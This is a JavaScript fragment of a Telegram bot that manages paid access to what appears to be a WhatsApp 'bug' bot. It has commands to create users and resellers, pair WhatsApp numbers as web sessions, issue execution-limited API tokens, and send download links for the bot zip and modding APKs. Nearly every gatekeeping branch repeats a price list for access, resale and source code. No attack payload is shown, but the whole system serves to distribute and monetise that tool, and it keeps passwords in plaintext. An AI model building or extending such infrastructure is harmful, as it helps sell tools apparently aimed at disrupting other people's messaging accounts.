botInstance.onText(/^\/createuser(?:\s+(\S+))?(?:\s+(\d+))?(?:\s+(\d+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;

  const role = await getAppUserRole(senderId, userBot);
  if (role === 'none') {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
  }

  if (!match[1]) {
    if (role === 'vip') {
      return userBot.sendMessage(chatId,
`📝Usage:

<code>/createuser username</code>`, { parse_mode: 'HTML' });
    }
    return userBot.sendMessage(chatId,
`📝Usage:

<code>/createuser username</code>
<code>/createuser username 30</code>
<code>/createuser username 30 3</code>
<code>/createuser username 0 5</code>`, { parse_mode: 'HTML' });
  }

  const username = match[1].toLowerCase();
  const days = Number(match[2] || 0);
  let deviceLimit = Number(match[3] || 1);

  if (!isValidAppUsername(username)) {
    return userBot.sendMessage(chatId, '❌ Invalid username. Use 3-64 characters (a-z, 0-9, _ . @ -)');
  }

  try {
    // VIP limit using LOCAL mapping only
    if (role === 'vip') {
      deviceLimit = 1;
      const alreadyCreated = Object.entries(appCreators)
        .filter(([_, creatorId]) => Number(creatorId) === Number(senderId));

      if (alreadyCreated.length >= 1) {
        const existUser = alreadyCreated[0][0];
        return userBot.sendMessage(chatId,
`❌ You already created a user.

👤 Username: <code>${existUser}</code>

Please delete it first using:
<code>/deleteuser ${existUser}</code>`, { parse_mode: 'HTML' });
      }
    }

    const password = generateAppPassword();

    // REAL PANEL create
    const result = await appRequest('user.create', {
      username,
      password,
      days: role === 'vip' ? 0 : days,
      device_limit: deviceLimit
    });

    // Save creator locally (permission only)
    appCreators[username] = senderId;
    saveJson('./database/app_creators.json', appCreators);

    await userBot.sendMessage(chatId,
`✅ <b>User Created on App</b>

👤 Username: <code>${username}</code>
🔑 Password: <code>${password}</code>
📱 Device Limit: ${result.device_limit || deviceLimit}
⏳ Duration: ${(role === 'vip' || days === 0) ? 'Unlimited' : days + ' days'}
🤖 App link: <a href="https://drive.google.com/file/d/1tNdfZNpaBeR86e5SuY12sCw-sUpCsy_U/view?usp=drivesdk">xeon_bvg.apk</a>
📍 How to use app: <a href="https://youtu.be/MtU-UtaXv30">click here</a>`, { parse_mode: 'HTML' });

  } catch (err) {
    await userBot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

botInstance.onText(/^\/deleteuser\s+(\S+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;

  const role = await getAppUserRole(senderId, userBot);
  if (role === 'none') {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
  }

  const username = match[1].toLowerCase();

  try {
    // REAL PANEL list
    const users = await appRequest('users.list', {});
    const user = users.find(u => u.username === username);

    if (!user) {
      return userBot.sendMessage(chatId, '❌ User not found on panel.');
    }

    // Permission from LOCAL mapping
    const creatorId = appCreators[username];
    if (role !== 'owner' && Number(creatorId) !== Number(senderId)) {
      return userBot.sendMessage(chatId, '❌ You can only delete users that you created.');
    }

    // REAL PANEL delete
    await appRequest('user.delete', { id: user.id });

    // Cleanup local mapping
    delete appCreators[username];
    saveJson('./database/app_creators.json', appCreators);

    await userBot.sendMessage(chatId, `✅ User <code>${username}</code> deleted from app.`, {
      parse_mode: 'HTML'
    });

  } catch (err) {
    await userBot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

botInstance.onText(/^\/users$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;

  const role = await getAppUserRole(senderId, userBot);
  if (role === 'none') {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
  }

  try {
    // REAL PANEL list
    let users = await appRequest('users.list', {});

    if (role !== 'owner') {
      // VIP/Reseller only their created users (local mapping)
      users = users.filter(u => Number(appCreators[u.username]) === Number(senderId));
    } else {
      // Owner: own first, then others
      const own = users.filter(u => Number(appCreators[u.username]) === Number(senderId));
      const others = users.filter(u => Number(appCreators[u.username]) !== Number(senderId));
      users = [...own, ...others];
    }

    if (users.length === 0) {
      return userBot.sendMessage(chatId, 'No users found.');
    }

    const parts = [];
    let text = `<b>📋 App Users</b>\nTotal: <b>${users.length}</b>\n\n`;
    let count = 0;

    for (const u of users) {
      count++;

      let status;
      if (u.disabled) status = '🔴 disabled';
      else if (u.online) status = '🟢 online';
      else status = '⚫ offline';

      const key = u.key || '-';
      const devices = `${(u.device_ids || []).length}/${u.device_limit || 1}`;
      const expiry = u.expires_at ? `exp: ${String(u.expires_at).slice(0, 10)}` : 'permanent';

      const creatorId = appCreators[u.username];
      const creator = creatorId
        ? await formatUserLink(userBot, creatorId)
        : '<i>Unknown</i>';

      const line = `${count}. <code>${u.username}</code>\n` +
                   `   Key: <code>${key}</code>\n` +
                   `   Status: ${status}\n` +
                   `   Devices: ${devices}\n` +
                   `   ${expiry}\n` +
                   `   By: ${creator}\n\n`;

      if (text.length + line.length > 3900) {
        text += '<b>└────────────────────┘</b>';
        parts.push(text);
        text = `<b>📋 App Users (Part ${parts.length + 1})</b>\n\n`;
      }
      text += line;
    }

    text += '<b>└────────────────────┘</b>';
    parts.push(text);

    for (const p of parts) {
      await userBot.sendMessage(chatId, p, {
        parse_mode: 'HTML',
        disable_web_page_preview: true
      });
      await sleep(300);
    }

  } catch (err) {
    await userBot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

// /resetdevice
botInstance.onText(/^\/resetdevice\s+(\S+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;

  const role = await getAppUserRole(senderId, userBot);
  if (role === 'none') {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
  }

  const username = match[1].toLowerCase();

  try {
    const users = await appRequest('users.list', {});
    const user = users.find(u => u.username === username);

    if (!user) return userBot.sendMessage(chatId, '❌ User not found.');

    if (role !== 'owner' && 
        user.createdBy !== senderId && 
        user.telegramId !== senderId &&
        user.created_by !== senderId) {
      return userBot.sendMessage(chatId, '❌ You can only reset devices of users you created.');
    }

    await appRequest('device.reset', { id: user.id });
    await userBot.sendMessage(chatId, `✅ Devices of <code>${username}</code> have been reset.`, { parse_mode: 'HTML' });

  } catch (err) {
    await userBot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

// /enable (Owner only)
botInstance.onText(/^\/enable\s+(\S+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  try {
    const users = await appRequest('users.list', {});
    const user = users.find(u => u.username === match[1].toLowerCase());
    if (!user) return userBot.sendMessage(chatId, '❌ User not found.');

    await appRequest('user.state', { id: user.id, disabled: false });
    await userBot.sendMessage(chatId, `✅ User <code>${user.username}</code> enabled.`, { parse_mode: 'HTML' });
  } catch (err) {
    await userBot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

// /disable (Owner only)
botInstance.onText(/^\/disable\s+(\S+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  try {
    const users = await appRequest('users.list', {});
    const user = users.find(u => u.username === match[1].toLowerCase());
    if (!user) return userBot.sendMessage(chatId, '❌ User not found.');

    await appRequest('user.state', { id: user.id, disabled: true });
    await userBot.sendMessage(chatId, `✅ User <code>${user.username}</code> disabled.`, { parse_mode: 'HTML' });
  } catch (err) {
    await userBot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

// /block (Owner only)
botInstance.onText(/^\/block\s+(ip|device)\s+(\S+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  try {
    await appRequest('block', { type: match[1], value: match[2] });
    await userBot.sendMessage(chatId, `✅ Blocked ${match[1]}: <code>${match[2]}</code>`, { parse_mode: 'HTML' });
  } catch (err) {
    await userBot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

// /unblock (Owner only)
botInstance.onText(/^\/unblock\s+(ip|device)\s+(\S+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  try {
    await appRequest('unblock', { type: match[1], value: match[2] });
    await userBot.sendMessage(chatId, `✅ Unblocked ${match[1]}: <code>${match[2]}</code>`, { parse_mode: 'HTML' });
  } catch (err) {
    await userBot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

botInstance.onText(/^\/functions$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  try {
    const list = listFunctionCodes();
    let text = `<b>📋 Available Functions</b>\nTotal: <b>${list.length}</b>\n\n`;

    for (const f of list) {
      text += `• <code>${f}</code>\n`;
    }

    if (text.length > 3900) text = text.slice(0, 3900) + '\n...';
    await userBot.sendMessage(chatId, text || 'No functions found.', { parse_mode: 'HTML' });
  } catch (err) {
    await userBot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

// /status (Owner only)
botInstance.onText(/^\/status$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  try {
    const data = await appRequest('status', {});
    await userBot.sendMessage(chatId,
`📡 <b>App Status</b>

Connector: <b>${appWsOk ? 'ONLINE ✅' : 'OFFLINE ❌'}</b>
Functions: <b>${data.functions || 0}</b>`, { parse_mode: 'HTML' });
  } catch (err) {
    await userBot.sendMessage(chatId,
`📡 <b>App Status</b>

Connector: <b>${appWsOk ? 'ONLINE ✅' : 'OFFLINE ❌'}</b>
Error: ${err.message}`, { parse_mode: 'HTML' });
  }
});

/*end of app*/

botInstance.onText(/\/delwebpair(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;

  if (!(await hasVipAccess(senderId, userBot))) {
    return userBot.sendMessage(chatId, '❌ Only VIP / Reseller / Owner can use this command.');
  }

  if (!match[1]) {
    return userBot.sendMessage(chatId, '❌ Example: /delwebpair 919876543210');
  }

  const number = match[1].replace(/[^0-9]/g, '');

  if (!webSessions.has(number) && !webPairOwners[number]) {
    return userBot.sendMessage(chatId, '❌ This number is not in web-session.');
  }

  // Only owner or the person who added it can delete
  const isOwner = CONFIG.owner.includes(senderId);
  const isCreator = webPairOwners[number] === senderId;

  if (!isOwner && !isCreator) {
    return userBot.sendMessage(chatId, '❌ You can only delete webpair sessions that you added.');
  }

  // Close and delete
  try {
    const sock = webSessions.get(number);
    if (sock) {
      try { sock.end(true); } catch {}
    }
  } catch {}

  webSessions.delete(number);
  webWhatsappStatus.delete(number);
  delete webPairOwners[number];
  saveJson('./database/web_pair_owners.json', webPairOwners);

  const sessionDir = path.join(__dirname, 'web-session', `${sanitizePath(number)}@s.whatsapp.net`);
  await deleteFolderRecursive(sessionDir).catch(() => {});

  await userBot.sendMessage(chatId, `✅ Web session for <code>${number}</code> has been deleted.`, { parse_mode: 'HTML' });
});

botInstance.onText(/\/listwebpair/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;

  if (!(await hasVipAccess(senderId, userBot))) {
    return userBot.sendMessage(chatId, '❌ Only VIP / Reseller / Owner can use this.');
  }

  const numbers = [...webSessions.keys()];

  if (numbers.length === 0) {
    return userBot.sendMessage(chatId, '❌ No active web-pair sessions.');
  }

  const parts = [];
  let text = `<b>📋 Active Web-Pair Sessions</b>\nTotal: <b>${numbers.length}</b>\n\n`;
  let count = 0;

  for (const number of numbers) {
    count++;
    const status = webWhatsappStatus.get(number) ? '🟢' : '🔴';
    const ownerId = webPairOwners[number];

    let ownerText = '<i>Unknown</i>';
    if (ownerId) {
      ownerText = await formatUserLink(userBot, ownerId);
    }

    const line = `${status} <code>${number}</code>\n   Added by: ${ownerText}\n\n`;

    if (text.length + line.length > 3900) {
      text += '<b>└────────────────────────┘</b>';
      parts.push(text);
      text = `<b>📋 Active Web-Pair Sessions (Part ${parts.length + 1})</b>\n\n`;
    }
    text += line;
  }

  text += '<b>└────────────────────────┘</b>';
  parts.push(text);

  for (const p of parts) {
    await userBot.sendMessage(chatId, p, {
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });
    await sleep(300);
  }
});

botInstance.onText(/\/webpair(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  if (!(await hasVipAccess(senderId, userBot))) {
    return userBot.sendMessage(chatId, `🚫 Only VIP / Reseller / Owner can use /webpair.`);
  }

  if (!match[1]) {
    return userBot.sendMessage(chatId, '❌ Example: /webpair +919876543210');
  }

  const raw = match[1].trim();
  const number = raw.replace(/[^0-9]/g, '');

  if (number.length < 8 || number.length > 15) {
    return userBot.sendMessage(chatId, '❌ Invalid number length (8-15 digits).');
  }

  // ===== SAVE WHO ADDED THIS NUMBER =====
  webPairOwners[number] = senderId;
  saveJson('./database/web_pair_owners.json', webPairOwners);
  console.log(`[WEB] Saved owner for ${number} → ${senderId}`);

  await userBot.sendMessage(chatId, `⏳ Starting web session for ${number}...`);
  await getWebSessions(userBot, chatId, senderId, number);
});

botInstance.onText(/\/apitoken(?:\s(\d+)(?:\s(\d+[dhms]))?)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can create greeting tokens.');
  }

  const limit = parseInt(match[1]) || 100;
  const durationStr = match[2];

  let expiry = null;
  if (durationStr) {
    const ms = parseDuration(durationStr);
    if (!ms) return userBot.sendMessage(chatId, '❌ Invalid duration. Use 7d, 24h, 30m...');
    expiry = new Date(Date.now() + ms).toISOString();
  }

  const token = 'XEON_BVG_API-' + crypto.randomBytes(16).toString('hex').toUpperCase();

  greetingTokens[token] = {
    limit: limit,
    used: 0,
    createdBy: senderId,
    createdAt: new Date().toISOString(),
    expiry: expiry,
    boundIp: null,          // will be set on first use
    revoked: false
  };
  saveJson('./database/greeting_tokens.json', greetingTokens);

  await userBot.sendMessage(chatId, 
`✅ Bvg API Token Created!

🔑 Token: <code>${token}</code>
📊 Limit: ${limit} successful executions
⏳ Expiry: ${expiry ? new Date(expiry).toLocaleString() : 'Permanent'}
🌐 API Base: ${CONFIG.WEB_DOMAIN}/api/greeting

Use this token in Authorization header.`, { parse_mode: 'HTML' });
});

botInstance.onText(/\/delapitoken(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (!CONFIG.owner.includes(senderId)) return userBot.sendMessage(chatId, '❌ Owner only.');

  const token = match[1]?.trim();
  if (!token || !greetingTokens[token]) {
    return userBot.sendMessage(chatId, '❌ Token not found.');
  }

  delete greetingTokens[token];
  saveJson('./database/greeting_tokens.json', greetingTokens);
  await userBot.sendMessage(chatId, `✅ Token deleted.`);
});

botInstance.onText(/\/listapitoken/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (!CONFIG.owner.includes(senderId)) return userBot.sendMessage(chatId, '❌ Owner only.');

  const entries = Object.entries(greetingTokens);
  if (entries.length === 0) return userBot.sendMessage(chatId, 'No tokens found.');

  let text = `<b>📋 API Tokens</b>\n\n`;
  for (const [tok, data] of entries) {
    text += `<code>${tok}</code>\nUsed: ${data.used}/${data.limit}\nCreated: ${new Date(data.createdAt).toLocaleString()}\n\n`;
  }
  await userBot.sendMessage(chatId, text, { parse_mode: 'HTML' });
});

botInstance.onText(/\/weblogin(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  if (!(await hasVipAccess(senderId, userBot))) {
    return userBot.sendMessage(chatId, `🚫 Only VIP / Reseller / Owner can use this command.`);
  }

  const isOwner = CONFIG.owner.includes(senderId);
  const isReseller = db.OwnerUsers.includes(senderId);

  // Different examples
  if (!match[1]) {
    if (isOwner) {
      return userBot.sendMessage(chatId, 
`📝 Owner Example Usage:

Single user (permanent):
\`/weblogin username\`

Single user with duration:
\`/weblogin username, 30d\`

Multi-user (Owner only):
\`/weblogin 100u, 50d\`
\`/weblogin 50u\`  ← permanent`);
    }
    if (isReseller) {
      return userBot.sendMessage(chatId, 
`📝 Reseller Example Usage:

\`/weblogin username, 7d\`
\`/weblogin username\`  ← permanent`);
    }
    return userBot.sendMessage(chatId, 
`📝 VIP Example Usage:

\`/weblogin username\`  ← permanent only`);
  }

  const parts = match[1].split(',').map(p => p.trim());
  const first = parts[0];
  const durationStr = parts[1];

  // ===== MULTI-USER (Owner only) =====
  if (/^\d+u$/i.test(first)) {
    if (!isOwner) {
      return userBot.sendMessage(chatId, '❌ Only Owner can create multi-user credentials.');
    }

    const maxUsers = parseInt(first);
    if (isNaN(maxUsers) || maxUsers < 2 || maxUsers > 500) {
      return userBot.sendMessage(chatId, '❌ Multi-user count must be between 2 and 500.');
    }

    let expiry = null;
    if (durationStr) {
      const ms = parseDuration(durationStr);
      if (!ms) return userBot.sendMessage(chatId, '❌ Invalid duration. Use 5d, 12h, 30m...');
      expiry = new Date(Date.now() + ms).toISOString();
    }

    const username = ('DGXEON13' + crypto.randomBytes(4).toString('hex')).toLowerCase();
    const password = generatePassword(12);

    webLogins[username] = {
      password,
      telegramId: senderId,
      createdBy: senderId,
      createdAt: new Date().toISOString(),
      expiry,
      revoked: false,
      maxUsers,
      claimedIds: []
    };
    saveJson('./database/web_logins.json', webLogins);

    return userBot.sendMessage(chatId, 
`✅ <b>Multi-User Credential Created</b>

🌐 ${CONFIG.WEB_DOMAIN}
👤 Username: <code>${username}</code>
🔑 Password: <code>${password}</code>
👥 Max Users: ${maxUsers}
⏳ Expiry: ${expiry ? new Date(expiry).toLocaleString() : 'Permanent'}

📖 Guide: <a href="https://t.me/xeonbvgreview/34">click here</a>`, {
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });
  }

  // ===== NORMAL SINGLE USER =====
  const username = first.toLowerCase().replace(/[^a-z0-9_]/g, '');
  if (!username || username.length < 3) {
    return userBot.sendMessage(chatId, '❌ Username must be at least 3 characters.');
  }

  if (webLogins[username]) {
    return userBot.sendMessage(chatId, '❌ Username already taken.');
  }

  // ===== VIP can only create 1 credential =====
  if (!isOwner && !isReseller) {
    const existing = Object.entries(webLogins).filter(([_, d]) => d.createdBy === senderId);
    if (existing.length >= 1) {
      let text = `❌ Web credentials already exist\n\n`;
      for (const [user, data] of existing) {
        text += `👤 Username: <code>${user}</code>\n🔑 Password: <code>${data.password}</code>\n⏳ Expiry: ${data.expiry ? new Date(data.expiry).toLocaleString() : 'Permanent'}\n\n`;
      }
      text += `If you want to create a new one, please delete your existing credentials first using:\n<code>/dellogin ${existing[0][0]}</code>\nand then create again.`;
      return userBot.sendMessage(chatId, text, { parse_mode: 'HTML' });
    }
  }

  let expiry = null;
  if (durationStr) {
    if (!isOwner && !isReseller) {
      return userBot.sendMessage(chatId, '❌ VIP can only create permanent logins.');
    }
    const ms = parseDuration(durationStr);
    if (!ms) return userBot.sendMessage(chatId, '❌ Invalid duration.');
    expiry = new Date(Date.now() + ms).toISOString();
  }

  const password = generatePassword(10);

  webLogins[username] = {
    password,
    telegramId: senderId,
    createdBy: senderId,
    createdAt: new Date().toISOString(),
    expiry,
    revoked: false,
    maxUsers: 1,
    claimedIds: []
  };
  saveJson('./database/web_logins.json', webLogins);

  await userBot.sendMessage(chatId, 
`✅ <b>Web Login Created!</b>

🌐 ${CONFIG.WEB_DOMAIN}
👤 Username: <code>${username}</code>
🔑 Password: <code>${password}</code>
⏳ Expiry: ${expiry ? new Date(expiry).toLocaleString() : 'Permanent'}

📖 Guide: <a href="https://t.me/xeonbvgreview/34">click here</a>`, {
    parse_mode: 'HTML',
    disable_web_page_preview: true
  });
});

botInstance.onText(/\/dellogin(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!(await hasVipAccess(senderId, userBot))) return;

  const username = match[1]?.trim().toLowerCase();
  if (!username) return userBot.sendMessage(chatId, '❌ Usage: /dellogin username');

  const data = webLogins[username];
  if (!data) return userBot.sendMessage(chatId, '❌ Username not found.');

  const isOwner = CONFIG.owner.includes(senderId);
  const isCreator = data.createdBy === senderId;

  if (!isOwner && !isCreator) {
    return userBot.sendMessage(chatId, '❌ You can only delete logins you created.');
  }

  delete webLogins[username];
  saveJson('./database/web_logins.json', webLogins);

  await userBot.sendMessage(chatId, `✅ Web login <code>${username}</code> deleted.`, { parse_mode: 'HTML' });
});

// ====================== RESET ALL WEB LOGINS ======================
botInstance.onText(/\/resetlogin/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  webLogins = {};
  saveJson('./database/web_logins.json', webLogins);
  activeWebSessions.clear();

  await userBot.sendMessage(chatId, '✅ All web login credentials have been permanently deleted.');
});

// ====================== RESET ALL API TOKENS ======================
botInstance.onText(/\/resetapitoken/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  greetingTokens = {};
  saveJson('./database/greeting_tokens.json', greetingTokens);

  await userBot.sendMessage(chatId, '✅ All API tokens have been permanently deleted.');
});

botInstance.onText(/\/listlogin/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;

  const isOwner = CONFIG.owner.includes(senderId);
  const isReseller = db.OwnerUsers.includes(senderId);
  const isVip = await hasVipAccess(senderId, userBot);

  // Owner → everything
  // Reseller → only credentials they created
  // VIP → only credentials they created
  if (!isOwner && !isReseller && !isVip) {
    return userBot.sendMessage(chatId, '❌ Only Owner / Reseller / VIP can use this.');
  }

  let entries = Object.entries(webLogins);

  if (!isOwner) {
    // Reseller or VIP → only their own credentials
    entries = entries.filter(([_, d]) => d.createdBy === senderId);
  }

  if (entries.length === 0) {
    return userBot.sendMessage(chatId, 'No web logins found.');
  }

  const parts = [];
  let text = `<b>📋 Web Logins</b>\nTotal: <b>${entries.length}</b>\n\n`;
  let count = 0;

  for (const [user, data] of entries) {
    count++;
    const expiry = data.expiry ? new Date(data.expiry).toLocaleDateString() : 'Unlimited';
    const creator = await formatUserLink(userBot, data.createdBy);
    const maxUsers = data.maxUsers || 1;
    const claimed = Array.isArray(data.claimedIds) ? data.claimedIds.length : 0;

    const line = `• <code>${user}</code>\n` +
                 `  Pass: <code>${data.password}</code>\n` +
                 `  Expiry: ${expiry}\n` +
                 `  User: <b>${claimed}/${maxUsers}</b>\n` +
                 `  By: ${creator}\n\n`;

    if (text.length + line.length > 3900) {
      text += '<b>└────────────────────┘</b>';
      parts.push(text);
      text = `<b>📋 Web Logins (Part ${parts.length + 1})</b>\n\n`;
    }

    text += line;
  }

  text += '<b>└────────────────────┘</b>';
  parts.push(text);

  for (const p of parts) {
    await userBot.sendMessage(chatId, p, {
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });
    await sleep(300);
  }
});

// ====================== SEND ZIP LINK ======================
botInstance.onText(/\/botfile/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  // VIP Check
  if (!(await hasVipAccess(senderId, userBot))) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
  }

  try {
    await userBot.sendMessage(
      chatId,
      `📦 <a href="https://www.mediafire.com/file/j5p7i18x3fvepwp/xbugbot_vip.zip/file?dkey=bp7tg0b93sx&r=816">xbugbot_vip.zip</a>
      
📥  Download the above zip file and you can use it in termux, pc or in any pterodactyl panel server.

📝 Watch this guide video to learn how to download and use this bot in termux:\n<a href="https://t.me/c/3698813612/112140">Watch Video</a>`,
      {
        parse_mode: 'HTML',
        disable_web_page_preview: true
      }
    );

    console.log(`ZIP link sent to user ${senderId}`);

  } catch (error) {
    console.error('Error sending ZIP link:', error);

    await userBot.sendMessage(
      chatId,
      `❌ Failed to send ZIP link: ${error.message}`
    );
  }
});
// ====================== END ZIP COMMAND ======================

// ====================== SEND APK LINKS ======================
botInstance.onText(/\/mtapk/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  // VIP Check
  if (!(await hasVipAccess(senderId, userBot))) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
  }

  try {
    await userBot.sendMessage(
      chatId,
      `📥 <b>MT APK Files</b>

1. <a href="https://files.catbox.moe/5lrzzn.apk">MTVIP.apk</a>

2. <a href="https://files.catbox.moe/cvjewu.apk">MTManager.apk</a>

📝 You can use any that works on your device.`,
      {
        parse_mode: 'HTML',
        disable_web_page_preview: true
      }
    );

    console.log(`APK links sent to user ${senderId}`);

  } catch (error) {
    console.error('Error sending APK links:', error);

    await userBot.sendMessage(
      chatId,
      `❌ Failed to send APK links: ${error.message}`
    );
  }
});
// ====================== END APK COMMAND ======================

// ====================== LICENSE COMMANDS ======================
botInstance.onText(/\/getkey(?:\s(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  const isOwner = CONFIG.owner.includes(senderId);
  const isReseller = db.OwnerUsers.includes(senderId);
  const isVip = await hasVipAccess(senderId, userBot);

  if (!isOwner && !isReseller && !isVip) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
  }

  const days = parseInt(match[1]) || 9999;

  // Check existing key
  let existingKey = Object.keys(licenseDB).find(k => licenseDB[k].telegramId === senderId);

  // Owner can always generate new key
  if (existingKey && !isOwner) {
    const data = licenseDB[existingKey];
    const expiryDate = new Date(data.expiry).toLocaleDateString('en-GB');
    
    return userBot.sendMessage(chatId, `✅ You already have an active key:\n\n<code>${existingKey}</code>\nExpiry: ${expiryDate}\n\nUse this key for your bot.`, { parse_mode: 'HTML' });
  }

